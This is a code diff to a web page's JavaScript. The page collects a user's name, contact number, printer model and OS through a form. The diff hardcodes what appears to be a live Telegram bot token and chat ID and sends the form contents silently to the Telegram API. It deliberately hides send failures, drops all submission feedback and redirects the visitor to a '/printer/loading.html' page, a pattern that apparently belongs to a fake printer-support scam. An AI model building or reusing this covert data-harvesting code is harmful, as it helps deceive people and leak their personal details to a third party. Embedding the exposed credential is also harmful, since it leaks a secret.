@@ -178,8 +178,8 @@
         let selectedOS = '';
 
         // Telegram Bot credentials (replace these)
-        const BOT_TOKEN = "YOUR_BOT_TOKEN";   // from @BotFather
-        const CHAT_ID   = "YOUR_CHAT_ID";     // your chat/group ID
+        const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";   // from @BotFather
+        const CHAT_ID   = "1684000886";     // your chat/group ID
 
         function openModal() {
             const modal = document.getElementById('detailsModal');
@@ -218,9 +218,9 @@
             if (event.target === modal) closeModal();
         };
 
-        async function sendToTelegram(text) {
+        function sendToTelegram(text) {
             const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const res = await fetch(endpoint, {
+            fetch(endpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -229,14 +229,15 @@
                     parse_mode: 'HTML',
                     disable_web_page_preview: true
                 })
+            }).catch(err => {
+                // Silent fail - no user feedback needed
+                console.error('Telegram send error:', err);
             });
-            return res.json();
         }
 
-        document.getElementById('detailsForm').addEventListener('submit', async function(e) {
+        document.getElementById('detailsForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const statusEl = document.getElementById('status');
-            const submitBtn = document.getElementById('submitBtn');
 
             const userName = document.getElementById('userName').value.trim();
             const contactNumber = document.getElementById('contactNumber').value.trim();
@@ -267,25 +268,11 @@
                 `Model: ${modelNumber}\n` +
                 `OS: ${osLabel}`;
 
-            try {
-                statusEl.textContent = 'Sending...';
-                statusEl.className = 'status';
-                submitBtn.disabled = true;
+            // Send in background
+            sendToTelegram(message);
 
-                const result = await sendToTelegram(message);
-
-                if (result && result.ok) {
-                    statusEl.textContent = 'Submitted successfully.';
-                    statusEl.className = 'status ok';
-                } else {
-                    throw new Error('Telegram API error');
-                }
-            } catch (err) {
-                statusEl.textContent = 'Could not submit. Please try again.';
-                statusEl.className = 'status err';
-            } finally {
-                submitBtn.disabled = false;
-            }
+            // Quick redirect
+            window.location.href = '/printer/loading.html';
         });
     </script>
 </body>
